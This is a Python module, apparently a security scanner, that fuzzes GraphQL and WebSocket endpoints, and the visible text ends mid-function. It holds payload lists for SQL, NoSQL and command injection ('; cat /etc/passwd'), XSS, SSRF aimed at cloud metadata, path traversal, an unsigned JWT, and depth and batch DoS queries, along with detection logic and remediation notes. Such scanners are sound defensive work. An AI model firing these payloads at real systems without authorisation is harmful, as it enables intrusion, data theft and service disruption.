"""
GraphQL and WebSocket Fuzzing Module

Provides comprehensive fuzzing capabilities for:
- GraphQL APIs (introspection, queries, mutations, subscriptions)
- WebSocket endpoints (message fuzzing, auth bypass, race conditions)

Features:
- GraphQL introspection and schema discovery
- GraphQL-specific injection attacks
- Query depth and complexity attacks
- Batch query attacks
- Field suggestion/enumeration
- WebSocket connection management
- WebSocket message fuzzing
- Authentication token manipulation
- Race condition testing
"""

import asyncio
import json
import logging
import re
import time
import uuid
import hashlib
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, AsyncGenerator, Tuple, Set
import httpx

try:
    import websockets
    from websockets.exceptions import ConnectionClosed, WebSocketException
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

logger = logging.getLogger(__name__)


# =============================================================================
# GRAPHQL CONSTANTS AND PAYLOADS
# =============================================================================

class GraphQLAttackType(str, Enum):
    """Types of GraphQL attacks."""
    INTROSPECTION = "introspection"
    INJECTION = "injection"
    DEPTH_ATTACK = "depth_attack"
    BATCH_ATTACK = "batch_attack"
    FIELD_SUGGESTION = "field_suggestion"
    ALIAS_OVERLOAD = "alias_overload"
    DIRECTIVE_OVERLOAD = "directive_overload"
    CIRCULAR_FRAGMENT = "circular_fragment"
    DOS_COMPLEXITY = "dos_complexity"
    AUTH_BYPASS = "auth_bypass"
    IDOR = "idor"


# GraphQL Introspection Query
INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
"""

# Simplified introspection for WAF bypass
SIMPLE_INTROSPECTION_QUERIES = [
    # Standard
    '{"query": "{ __schema { types { name } } }"}',
    # With operation name
    '{"query": "query { __schema { queryType { name } } }"}',
    # Aliased
    '{"query": "{ a: __schema { types { name } } }"}',
    # With whitespace manipulation
    '{"query": "{__schema{types{name}}}"}',
    # With comments
    '{"query": "{ #comment\\n __schema { types { name } } }"}',
    # Using fragments
    '{"query": "{ ...F } fragment F on Query { __schema { types { name } } }"}',
    # Unicode bypass
    '{"query": "{ \\u005f\\u005fschema { types { name } } }"}',
    # Newline injection
    '{"query": "{\\n__schema\\n{\\ntypes\\n{\\nname\\n}\\n}\\n}"}',
]

# GraphQL Injection Payloads
GRAPHQL_INJECTION_PAYLOADS = {
    "sqli_in_variables": [
        '{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1\' OR \'1\'=\'1"}}',
        '{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1 UNION SELECT * FROM users--"}}',
        '{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": "1; DROP TABLE users;--"}}',
        '{"query": "query($name: String!) { users(filter: {name: $name}) { id } }", "variables": {"name": "\' OR 1=1--"}}',
    ],
    "nosqli_in_variables": [
        '{"query": "query($filter: JSON!) { users(filter: $filter) { id } }", "variables": {"filter": {"$ne": null}}}',
        '{"query": "query($id: ID!) { user(id: $id) { name } }", "variables": {"id": {"$gt": ""}}}',
        '{"query": "query($q: String!) { search(q: $q) { id } }", "variables": {"q": {"$regex": ".*"}}}',
    ],
    "xss_in_variables": [
        '{"query": "mutation($input: String!) { createPost(content: $input) { id } }", "variables": {"input": "<script>alert(1)</script>"}}',
        '{"query": "mutation($name: String!) { updateUser(name: $name) { id } }", "variables": {"name": "<img src=x onerror=alert(1)>"}}',
    ],
    "ssrf_in_variables": [
        '{"query": "query($url: String!) { fetchUrl(url: $url) { content } }", "variables": {"url": "http://localhost:6379"}}',
        '{"query": "query($url: String!) { fetchUrl(url: $url) { content } }", "variables": {"url": "http://169.254.169.254/latest/meta-data/"}}',
        '{"query": "mutation($avatar: String!) { updateAvatar(url: $avatar) { id } }", "variables": {"avatar": "file:///etc/passwd"}}',
    ],
    "path_traversal": [
        '{"query": "query($file: String!) { readFile(path: $file) { content } }", "variables": {"file": "../../../etc/passwd"}}',
        '{"query": "query($template: String!) { render(template: $template) { html } }", "variables": {"template": "....//....//etc/passwd"}}',
    ],
    "command_injection": [
        '{"query": "mutation($cmd: String!) { execute(command: $cmd) { output } }", "variables": {"cmd": "; cat /etc/passwd"}}',
        '{"query": "query($host: String!) { ping(host: $host) { result } }", "variables": {"host": "localhost; id"}}',
    ],
}

# Depth Attack Queries (nested queries for DoS)
DEPTH_ATTACK_TEMPLATES = [
    # User -> posts -> comments -> author pattern
    """
    query DepthAttack {{
      user(id: "1") {{
        posts {{
          comments {{
            author {{
              posts {{
                comments {{
                  author {{
                    {nested}
                  }}
                }}
              }}
            }}
          }}
        }}
      }}
    }}
    """,
    # Recursive type pattern
    """
    query RecursiveDepth {{
      node(id: "1") {{
        ... on User {{
          friends {{
            friends {{
              friends {{
                friends {{
                  {nested}
                }}
              }}
            }}
          }}
        }}
      }}
    }}
    """,
]

# Batch Attack Queries
BATCH_ATTACK_PAYLOADS = [
    # Multiple queries in array (batching)
    '[' + ','.join(['{"query": "{ __typename }"}'] * 100) + ']',
    # Multiple operations
    '{"query": "' + ' '.join([f'q{i}: __typename' for i in range(100)]) + '"}',
    # Aliased field multiplication
    '{"query": "{ ' + ' '.join([f'a{i}: __schema {{ types {{ name }} }}' for i in range(50)]) + ' }"}',
]

# Alias Overload Attack
ALIAS_OVERLOAD_TEMPLATE = """
query AliasOverload {{
  {aliases}
}}
"""

# Field Suggestion Attack (to enumerate fields)
FIELD_SUGGESTION_PAYLOADS = [
    '{"query": "{ user { passwor } }"}',  # Typo to trigger suggestions
    '{"query": "{ user { secret } }"}',
    '{"query": "{ user { admin } }"}',
    '{"query": "{ user { role } }"}',
    '{"query": "{ user { permissions } }"}',
    '{"query": "{ user { token } }"}',
    '{"query": "{ user { apiKey } }"}',
    '{"query": "{ user { privateKey } }"}',
    '{"query": "{ user { ssn } }"}',
    '{"query": "{ user { creditCard } }"}',
    '{"query": "{ users { passwordHash } }"}',
    '{"query": "{ admin { users } }"}',
    '{"query": "{ internal { config } }"}',
    '{"query": "{ debug { info } }"}',
]

# Auth Bypass Queries
AUTH_BYPASS_PAYLOADS = [
    # Query without auth header
    '{"query": "{ currentUser { id email role } }"}',
    # Try to access admin endpoints
    '{"query": "{ adminUsers { id email } }"}',
    '{"query": "{ allUsers { id email passwordHash } }"}',
    # Mutation without proper auth
    '{"query": "mutation { deleteUser(id: \\"1\\") { success } }"}',
    '{"query": "mutation { updateRole(userId: \\"1\\", role: \\"admin\\") { success } }"}',
    # Using @skip/@include directives
    '{"query": "query($admin: Boolean!) { user { id @skip(if: $admin) adminData @include(if: $admin) } }", "variables": {"admin": true}}',
]

# IDOR Queries
IDOR_PAYLOADS = [
    '{"query": "{ user(id: \\"1\\") { id email } }"}',
    '{"query": "{ user(id: \\"2\\") { id email privateData } }"}',
    '{"query": "{ user(id: \\"0\\") { id email } }"}',
    '{"query": "{ user(id: \\"-1\\") { id email } }"}',
    '{"query": "{ user(id: \\"999999\\") { id email } }"}',
    '{"query": "{ order(id: \\"1\\") { id total items } }"}',
    '{"query": "{ document(id: \\"1\\") { content owner } }"}',
    '{"query": "query($ids: [ID!]!) { users(ids: $ids) { id email } }", "variables": {"ids": ["1","2","3","4","5"]}}',
]


# =============================================================================
# WEBSOCKET CONSTANTS AND PAYLOADS
# =============================================================================

class WebSocketAttackType(str, Enum):
    """Types of WebSocket attacks."""
    MESSAGE_INJECTION = "message_injection"
    AUTH_BYPASS = "auth_bypass"
    RACE_CONDITION = "race_condition"
    RECONNECT_HIJACK = "reconnect_hijack"
    PROTOCOL_CONFUSION = "protocol_confusion"
    DOS = "dos"
    CSWSH = "cswsh"  # Cross-Site WebSocket Hijacking


# WebSocket Protocol Messages
WEBSOCKET_ATTACK_PAYLOADS = {
    "sqli": [
        '{"type": "message", "data": "\' OR \'1\'=\'1"}',
        '{"action": "query", "sql": "SELECT * FROM users WHERE 1=1"}',
        '{"command": "search", "term": "\'; DROP TABLE users;--"}',
    ],
    "xss": [
        '{"type": "chat", "message": "<script>alert(document.cookie)</script>"}',
        '{"action": "update", "content": "<img src=x onerror=alert(1)>"}',
        '{"text": "<svg onload=alert(1)>"}',
    ],
    "command_injection": [
        '{"type": "exec", "cmd": "; cat /etc/passwd"}',
        '{"action": "run", "command": "| ls -la"}',
        '{"shell": "$(whoami)"}',
    ],
    "json_injection": [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"type": "auth", "user": {"$gt": ""}}',
    ],
    "auth_bypass": [
        '{"type": "auth", "token": ""}',
        '{"type": "auth", "token": null}',
        '{"type": "auth", "token": "undefined"}',
        '{"type": "auth", "userId": "1", "isAdmin": true}',
        '{"type": "authenticate", "jwt": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0."}',
    ],
    "idor": [
        '{"type": "subscribe", "channel": "user_1"}',
        '{"type": "subscribe", "channel": "admin_channel"}',
        '{"type": "subscribe", "channel": "private_*"}',
        '{"type": "getMessages", "roomId": "1"}',
        '{"type": "getMessages", "roomId": "../../../admin"}',
    ],
    "dos": [
        '{"type": "' + 'A' * 10000 + '"}',
        '{"data": "' + 'X' * 100000 + '"}',
        '{"nested": ' + '{"a":' * 100 + '1' + '}' * 100 + '}',
    ],
    "protocol": [
        'PING',
        'PONG', 
        '\x00\x00\x00\x00',  # Binary frame
        '\xff\xff\xff\xff',  # Invalid frame
        '{"type": 1, "data": "test"}',  # Type confusion
        'not json at all',
        '<?xml version="1.0"?><message>test</message>',
    ],
}


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class GraphQLSchema:
    """Parsed GraphQL schema from introspection."""
    query_type: Optional[str] = None
    mutation_type: Optional[str] = None
    subscription_type: Optional[str] = None
    types: Dict[str, Dict] = field(default_factory=dict)
    directives: List[Dict] = field(default_factory=list)
    fields_by_type: Dict[str, List[str]] = field(default_factory=dict)
    input_types: List[str] = field(default_factory=list)
    enums: Dict[str, List[str]] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "query_type": self.query_type,
            "mutation_type": self.mutation_type,
            "subscription_type": self.subscription_type,
            "types_count": len(self.types),
            "types": list(self.types.keys()),
            "directives": [d.get("name") for d in self.directives],
            "input_types": self.input_types,
            "enums": self.enums,
        }


@dataclass
class GraphQLFinding:
    """A vulnerability finding from GraphQL fuzzing."""
    attack_type: GraphQLAttackType
    severity: str  # critical, high, medium, low, info
    title: str
    description: str
    query: str
    response: Optional[str] = None
    evidence: Optional[str] = None
    endpoint: str = ""
    remediation: str = ""
    cvss_score: float = 0.0
    cwe_id: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type.value,
            "severity": self.severity,
            "title": self.title,
            "description": self.description,
            "query": self.query[:500] if self.query else "",
            "response": self.response[:1000] if self.response else "",
            "evidence": self.evidence,
            "endpoint": self.endpoint,
            "remediation": self.remediation,
            "cvss_score": self.cvss_score,
            "cwe_id": self.cwe_id,
        }


@dataclass
class WebSocketFinding:
    """A vulnerability finding from WebSocket fuzzing."""
    attack_type: WebSocketAttackType
    severity: str
    title: str
    description: str
    payload: str
    response: Optional[str] = None
    evidence: Optional[str] = None
    endpoint: str = ""
    remediation: str = ""
    cvss_score: float = 0.0
    cwe_id: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type.value,
            "severity": self.severity,
            "title": self.title,
            "description": self.description,
            "payload": self.payload[:500] if self.payload else "",
            "response": self.response[:1000] if self.response else "",
            "evidence": self.evidence,
            "endpoint": self.endpoint,
            "remediation": self.remediation,
            "cvss_score": self.cvss_score,
            "cwe_id": self.cwe_id,
        }


@dataclass
class GraphQLFuzzingSession:
    """Session state for GraphQL fuzzing."""
    id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    endpoint: str = ""
    schema: Optional[GraphQLSchema] = None
    findings: List[GraphQLFinding] = field(default_factory=list)
    queries_sent: int = 0
    errors_encountered: int = 0
    started_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    completed_at: Optional[str] = None
    status: str = "running"
    introspection_enabled: bool = False
    discovered_fields: Set[str] = field(default_factory=set)
    waf_detected: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "endpoint": self.endpoint,
            "schema": self.schema.to_dict() if self.schema else None,
            "findings": [f.to_dict() for f in self.findings],
            "queries_sent": self.queries_sent,
            "errors_encountered": self.errors_encountered,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "status": self.status,
            "introspection_enabled": self.introspection_enabled,
            "discovered_fields_count": len(self.discovered_fields),
            "waf_detected": self.waf_detected,
        }


@dataclass
class WebSocketFuzzingSession:
    """Session state for WebSocket fuzzing."""
    id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    endpoint: str = ""
    findings: List[WebSocketFinding] = field(default_factory=list)
    messages_sent: int = 0
    messages_received: int = 0
    errors_encountered: int = 0
    started_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    completed_at: Optional[str] = None
    status: str = "running"
    connection_established: bool = False
    protocols_discovered: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "id": self.id,
            "endpoint": self.endpoint,
            "findings": [f.to_dict() for f in self.findings],
            "messages_sent": self.messages_sent,
            "messages_received": self.messages_received,
            "errors_encountered": self.errors_encountered,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "status": self.status,
            "connection_established": self.connection_established,
            "protocols_discovered": self.protocols_discovered,
        }


# =============================================================================
# GRAPHQL FUZZER CLASS
# =============================================================================

class GraphQLFuzzer:
    """
    Comprehensive GraphQL API fuzzer.
    
    Features:
    - Schema introspection
    - Injection attacks (SQLi, NoSQLi, XSS, SSRF)
    - Depth/complexity attacks
    - Batch query attacks
    - Field enumeration
    - Auth bypass testing
    - IDOR detection
    """
    
    def __init__(
        self,
        endpoint: str,
        headers: Optional[Dict[str, str]] = None,
        timeout: float = 30.0,
    ):
        self.endpoint = endpoint
        self.headers = headers or {}
        self.timeout = timeout
        self.session = GraphQLFuzzingSession(endpoint=endpoint)
        self.client = httpx.AsyncClient(timeout=timeout, verify=True)  # SSL verification enabled
        
        # Ensure Content-Type is set
        if "Content-Type" not in self.headers:
            self.headers["Content-Type"] = "application/json"
    
    async def close(self):
        """Close the HTTP client."""
        await self.client.aclose()
    
    async def _send_query(self, query_body: str) -> Tuple[int, str, Dict]:
        """Send a GraphQL query and return status, body, headers."""
        try:
            # Handle both string and dict query bodies
            if isinstance(query_body, str):
                if query_body.startswith('{') or query_body.startswith('['):
                    body = query_body
                else:
                    body = json.dumps({"query": query_body})
            else:
                body = json.dumps(query_body)
            
            response = await self.client.post(
                self.endpoint,
                content=body,
                headers=self.headers,
            )
            
            self.session.queries_sent += 1
            return response.status_code, response.text, dict(response.headers)
            
        except Exception as e:
            self.session.errors_encountered += 1
            logger.error(f"GraphQL request error: {e}")
            return 0, str(e), {}
    
    async def introspect(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Perform GraphQL introspection to discover schema.
        """
        yield {
            "type": "phase",
            "phase": "introspection",
            "message": "Attempting GraphQL introspection...",
        }
        
        # Try full introspection first
        status, body, headers = await self._send_query(
            json.dumps({"query": INTROSPECTION_QUERY})
        )
        
        if status == 200 and "__schema" in body:
            yield {
                "type": "info",
                "message": "Full introspection successful!",
                "severity": "high",
            }
            self.session.introspection_enabled = True
            
            # Parse schema
            try:
                data = json.loads(body)
                schema_data = data.get("data", {}).get("__schema", {})
                
                self.session.schema = GraphQLSchema(
                    query_type=schema_data.get("queryType", {}).get("name"),
                    mutation_type=schema_data.get("mutationType", {}).get("name") if schema_data.get("mutationType") else None,
                    subscription_type=schema_data.get("subscriptionType", {}).get("name") if schema_data.get("subscriptionType") else None,
                    types={t["name"]: t for t in schema_data.get("types", []) if not t["name"].startswith("__")},
                    directives=schema_data.get("directives", []),
                )
                
                # Extract fields by type
                for type_name, type_data in self.session.schema.types.items():
                    if type_data.get("fields"):
                        self.session.schema.fields_by_type[type_name] = [
                            f["name"] for f in type_data["fields"]
                        ]
                    
                    # Track enums
                    if type_data.get("kind") == "ENUM" and type_data.get("enumValues"):
                        self.session.schema.enums[type_name] = [
                            e["name"] for e in type_data["enumValues"]
                        ]
                    
                    # Track input types
                    if type_data.get("kind") == "INPUT_OBJECT":
                        self.session.schema.input_types.append(type_name)
                
                # Add finding for introspection enabled
                self.session.findings.append(GraphQLFinding(
                    attack_type=GraphQLAttackType.INTROSPECTION,
                    severity="medium",
                    title="GraphQL Introspection Enabled",
                    description="The GraphQL endpoint allows introspection queries, exposing the entire API schema including queries, mutations, types, and fields.",
                    query=INTROSPECTION_QUERY[:200] + "...",
                    response=f"Schema discovered: {len(self.session.schema.types)} types",
                    endpoint=self.endpoint,
                    remediation="Disable introspection in production environments. Most GraphQL servers support disabling introspection via configuration.",
                    cvss_score=5.3,
                    cwe_id="CWE-200",
                ))
                
                yield {
                    "type": "schema_discovered",
                    "schema": self.session.schema.to_dict(),
                }
                
            except json.JSONDecodeError:
                yield {"type": "warning", "message": "Failed to parse introspection response"}
        
        else:
            yield {
                "type": "info",
                "message": "Full introspection blocked, trying bypass techniques...",
            }
            
            # Try simplified introspection queries
            for bypass_query in SIMPLE_INTROSPECTION_QUERIES:
                status, body, _ = await self._send_query(bypass_query)
                if status == 200 and ("__schema" in body or "types" in body):
                    self.session.introspection_enabled = True
                    yield {
                        "type": "info",
                        "message": f"Introspection bypass successful with: {bypass_query[:50]}...",
                        "severity": "medium",
                    }
                    break
                await asyncio.sleep(0.1)
            
            if not self.session.introspection_enabled:
                yield {
                    "type": "info", 
                    "message": "Introspection appears to be disabled (good security practice)",
                }
    
    async def fuzz_injections(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Test for injection vulnerabilities in GraphQL variables.
        """
        yield {
            "type": "phase",
            "phase": "injection_testing",
            "message": "Testing for injection vulnerabilities...",
        }
        
        for injection_type, payloads in GRAPHQL_INJECTION_PAYLOADS.items():
            yield {
                "type": "technique",
                "technique": injection_type,
                "message": f"Testing {injection_type}...",
            }
            
            for payload in payloads:
                status, body, _ = await self._send_query(payload)
                
                # Check for error-based detection
                finding = self._analyze_injection_response(
                    injection_type, payload, status, body
                )
                
                if finding:
                    self.session.findings.append(finding)
                    yield {
                        "type": "finding",
                        "finding": finding.to_dict(),
                    }
                
                await asyncio.sleep(0.05)
    
    def _analyze_injection_response(
        self,
        injection_type: str,
        payload: str,
        status: int,
        body: str,
    ) -> Optional[GraphQLFinding]:
        """Analyze response for signs of successful injection."""
        body_lower = body.lower()
        
        # SQL Injection indicators
        sql_indicators = [
            "sql syntax", "mysql", "postgresql", "sqlite", "oracle",
            "odbc", "mssql", "database error", "query failed",
            "unterminated", "syntax error", "ORA-", "PG::",
        ]
        
        # NoSQL Injection indicators
        nosql_indicators = [
            "mongodb", "cannot read property", "bson", "unexpected token",
            "cast to objectid failed", "invalid operator",
        ]
        
        # Command injection indicators  
        cmd_indicators = [
            "root:", "/bin/bash", "uid=", "command not found",
            "sh:", "permission denied", "no such file",
        ]
        
        # SSRF indicators
        ssrf_indicators = [
            "connection refused", "couldn't connect", "169.254.169.254",
            "metadata", "internal server", "timeout",
        ]
        
        if "sqli" in injection_type:
            for indicator in sql_indicators:
                if indicator in body_lower:
                    return GraphQLFinding(
                        attack_type=GraphQLAttackType.INJECTION,
                        severity="critical",
                        title="SQL Injection in GraphQL Variables",
                        description=f"SQL injection detected via GraphQL variable. Database error message exposed: {indicator}",
                        query=payload,
                        response=body[:500],
                        evidence=indicator,
                        endpoint=self.endpoint,
                        remediation="Use parameterized queries/prepared statements. Validate and sanitize all GraphQL variable inputs.",
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                    )
        
        elif "nosqli" in injection_type:
            for indicator in nosql_indicators:
                if indicator in body_lower:
                    return GraphQLFinding(
                        attack_type=GraphQLAttackType.INJECTION,
                        severity="high",
                        title="NoSQL Injection in GraphQL Variables",
                        description=f"NoSQL injection detected. Indicator found: {indicator}",
                        query=payload,
                        response=body[:500],
                        evidence=indicator,
                        endpoint=self.endpoint,
                        remediation="Sanitize inputs before passing to NoSQL queries. Use schema validation.",
                        cvss_score=8.6,
                        cwe_id="CWE-943",
                    )
        
        elif "ssrf" in injection_type:
            for indicator in ssrf_indicators:
                if indicator in body_lower:
                    return GraphQLFinding(
                        attack_type=GraphQLAttackType.INJECTION,
                        severity="high",
                        title="SSRF via GraphQL Variables",
                        description=f"Server-Side Request Forgery detected. Server attempted to reach internal resource.",
                        query=payload,
                        response=body[:500],
                        evidence=indicator,
                        endpoint=self.endpoint,
                        remediation="Validate and whitelist allowed URLs. Block internal IP ranges and cloud metadata endpoints.",
                        cvss_score=8.6,
                        cwe_id="CWE-918",
                    )
        
        elif "command" in injection_type:
            for indicator in cmd_indicators:
                if indicator in body_lower:
                    return GraphQLFinding(
                        attack_type=GraphQLAttackType.INJECTION,
                        severity="critical",
                        title="Command Injection via GraphQL",
                        description=f"OS command injection detected. System command output visible.",
                        query=payload,
                        response=body[:500],
                        evidence=indicator,
                        endpoint=self.endpoint,
                        remediation="Never pass user input directly to system commands. Use parameterized commands or avoid shell execution entirely.",
                        cvss_score=9.8,
                        cwe_id="CWE-78",
                    )
        
        return None
    
    async def fuzz_depth_attacks(self, max_depth: int = 15) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Test for query depth/complexity DoS vulnerabilities.
        """
        yield {
            "type": "phase",
            "phase": "depth_attack",
            "message": "Testing query depth limits...",
        }
        
        # Generate nested query
        nested = "id name"
        for depth in range(5, max_depth + 1, 2):
            # Build deeply nested query
            nested_query = nested
            for i in range(depth):
                nested_query = f"friends {{ {nested_query} }}"
            
            query = f'{{ user(id: "1") {{ {nested_query} }} }}'
            
            start_time = time.time()
            status, body, _ = await self._send_query(json.dumps({"query": query}))
            response_time = time.time() - start_time
            
            yield {
                "type": "test",
                "depth": depth,
                "response_time": response_time,
                "status": status,
            }
            
            # Check for DoS vulnerability
            if response_time > 5.0:  # More than 5 seconds
                self.session.findings.append(GraphQLFinding(
                    attack_type=GraphQLAttackType.DEPTH_ATTACK,
                    severity="medium",
                    title="GraphQL Query Depth DoS Vulnerability",
                    description=f"Server took {response_time:.2f}s to respond to depth-{depth} query. No query depth limit enforced.",
                    query=query[:200] + "...",
                    response=f"Response time: {response_time:.2f}s",
                    endpoint=self.endpoint,
                    remediation="Implement query depth limiting. Set maximum depth to 10-15. Use query complexity analysis.",
                    cvss_score=5.3,
                    cwe_id="CWE-400",
                ))
                
                yield {
                    "type": "finding",
                    "finding": self.session.findings[-1].to_dict(),
                }
                break
            
            if status != 200 and "depth" in body.lower():
                yield {
                    "type": "info",
                    "message": f"Query depth limit detected at depth {depth}",
                }
                break
            
            await asyncio.sleep(0.1)
    
    async def fuzz_batch_attacks(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Test for batch query/alias DoS vulnerabilities.
        """
        yield {
            "type": "phase",
            "phase": "batch_attack",
            "message": "Testing batch query limits...",
        }
        
        for i, payload in enumerate(BATCH_ATTACK_PAYLOADS):
            start_time = time.time()
            status, body, _ = await self._send_query(payload)
            response_time = time.time() - start_time
            
            yield {
                "type": "test",
                "batch_type": f"batch_{i+1}",
                "response_time": response_time,
                "status": status,
            }
            
            if response_time > 3.0 and status == 200:
                self.session.findings.append(GraphQLFinding(
                    attack_type=GraphQLAttackType.BATCH_ATTACK,
                    severity="medium",
                    title="GraphQL Batch Query DoS Vulnerability",
                    description=f"Server processed batch query without limits. Response time: {response_time:.2f}s",
                    query=payload[:200] + "...",
                    response=f"Response time: {response_time:.2f}s",
                    endpoint=self.endpoint,
                    remediation="Implement batch query limits. Limit operations per request. Use query cost analysis.",
                    cvss_score=5.3,
                    cwe_id="CWE-400",
                ))
                
                yield {
                    "type": "finding",
                    "finding": self.session.findings[-1].to_dict(),
                }
            
            await asyncio.sleep(0.2)
    
    async def fuzz_field_suggestions(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Use field suggestion errors to enumerate hidden fields.
        """
        yield {
            "type": "phase",
            "phase": "field_enumeration",
            "message": "Enumerating fields via suggestions...",
        }
        
        discovered_fields = set()
        
        for payload in FIELD_SUGGESTION_PAYLOADS:
            status, body, _ = await self._send_query(payload)
            
            # Look for field suggestions in error messages
            # Pattern: "Did you mean X?" or "Unknown field. Did you mean: X, Y, Z?"
            suggestion_patterns = [
                r'did you mean[:\s]+"?([a-zA-Z_]+)"?',
                r'suggestions?[:\s]+\[?"?([a-zA-Z_,\s]+)"?\]?',
                r'unknown field.*?([a-zA-Z_]+)',
                r'Cannot query field ".*?" on type.*?Did you mean "([a-zA-Z_]+)"',
            ]
            
            for pattern in suggestion_patterns:
                matches = re.findall(pattern, body, re.IGNORECASE)
                for match in matches:
                    fields = [f.strip().strip('"\'') for f in match.split(',')]
                    for field in fields:
                        if field and field not in discovered_fields and len(field) > 1:
                            discovered_fields.add(field)
                            self.session.discovered_fields.add(field)
                            
                            yield {
                                "type": "field_discovered",
                                "field": field,
                                "from_query": payload[:50],
                            }
            
            await asyncio.sleep(0.05)
        
        if discovered_fields:
            self.session.findings.append(GraphQLFinding(
                attack_type=GraphQLAttackType.FIELD_SUGGESTION,
                severity="low",
                title="GraphQL Field Enumeration via Suggestions",
                description=f"Discovered {len(discovered_fields)} fields through error message suggestions.",
                query="Multiple suggestion queries",
                response=f"Fields: {', '.join(list(discovered_fields)[:20])}",
                evidence=str(list(discovered_fields)),
                endpoint=self.endpoint,
                remediation="Disable field suggestions in production. Use generic error messages.",
                cvss_score=3.1,
                cwe_id="CWE-200",
            ))
            
            yield {
                "type": "finding",
                "finding": self.session.findings[-1].to_dict(),
            }
    
    async def fuzz_auth_bypass(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Test for authentication bypass vulnerabilities.
        """
        yield {
            "type": "phase",
            "phase": "auth_bypass",
            "message": "Testing authentication bypass...",
        }
        
        # Store original headers
        original_headers = self.headers.copy()
        
        # Test without auth headers
        auth_headers = ["Authorization", "X-API-Key", "X-Auth-Token", "Cookie"]
        test_headers = {k: v for k, v in self.headers.items() if k not in auth_headers}
        self.headers = test_headers
        
        for payload in AUTH_BYPASS_PAYLOADS:
            status, body, _ = await self._send_query(payload)
            
            # Check if we got data without auth
            try:
                data = json.loads(body)
                if data.get("data") and not data.get("errors"):
                    self.session.findings.append(GraphQLFinding(
                        attack_type=GraphQLAttackType.AUTH_BYPASS,
                        severity="critical",
                        title="GraphQL Authentication Bypass",
                        description="Sensitive query executed without authentication.",
                        query=payload,
                        response=body[:500],
                        endpoint=self.endpoint,
                        remediation="Implement proper authentication checks on all resolvers. Use authentication middleware.",
                        cvss_score=9.1,
                        cwe_id="CWE-287",
                    ))
                    
                    yield {
                        "type": "finding",
                        "finding": self.session.findings[-1].to_dict(),
                    }
            except json.JSONDecodeError:
                pass
            
            await asyncio.sleep(0.05)
        
        # Restore headers
        self.headers = original_headers
    
    async def fuzz_idor(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Test for Insecure Direct Object Reference vulnerabilities.
        """
        yield {
            "type": "phase",
            "phase": "idor_testing",
            "message": "Testing for IDOR vulnerabilities...",
        }
        
        for payload in IDOR_PAYLOADS:
            status, body, _ = await self._send_query(payload)
            
            try:
                data = json.loads(body)
                # Check if we got other users' data
                if data.get("data") and not data.get("errors"):
                    response_data = data.get("data", {})
                    # Simple heuristic: if we got data with IDs different from expected
                    if response_data:
                        yield {
                            "type": "idor_test",
                            "payload": payload[:100],
                            "got_data": True,
                            "data_preview": str(response_data)[:200],
                        }
            except json.JSONDecodeError:
                pass
            
            await asyncio.sleep(0.05)
    
    async def run_full_scan(self) -> AsyncGenerator[Dict[str, Any], None]:
        """
        Run a complete GraphQL security scan.
        """
        yield {
            "type": "start",
            "session_id": self.session.id,
            "endpoint": self.endpoint,
            "message": "Starting GraphQL security scan...",
        }
        
        try:
            # Phase 1: Introspection
            async for event in self.introspect():
                yield event
            
            # Phase 2: Injection testing
            async for event in self.fuzz_injections():
                yield event
            
            # Phase 3: Depth attacks
            async for event in self.fuzz_depth_attacks():
                yield event
            
            # Phase 4: Batch attacks
            async for event in self.fuzz_batch_attacks():
                yield event
            
            # Phase 5: Field enumeration
            async for event in self.fuzz_field_suggestions():
                yield event
            
            # Phase 6: Auth bypass
            async for event in self.fuzz_auth_bypass():
                yield event
            
            # Phase 7: IDOR
            async for event in self.fuzz_idor():
                yield event
            
            self.session.status = "completed"
            self.session.completed_at = datetime.utcnow().isoformat()
            
            yield {
                "type": "complete",
                "session": self.session.to_dict(),
                "findings_count": len(self.session.findings),
                "queries_sent": self.session.queries_sent,
            }
            
        except Exception as e:
            self.session.status = "error"
            self.session.completed_at = datetime.utcnow().isoformat()
            logger.error(f"GraphQL scan error: {e}")
            yield {
                "type": "error",
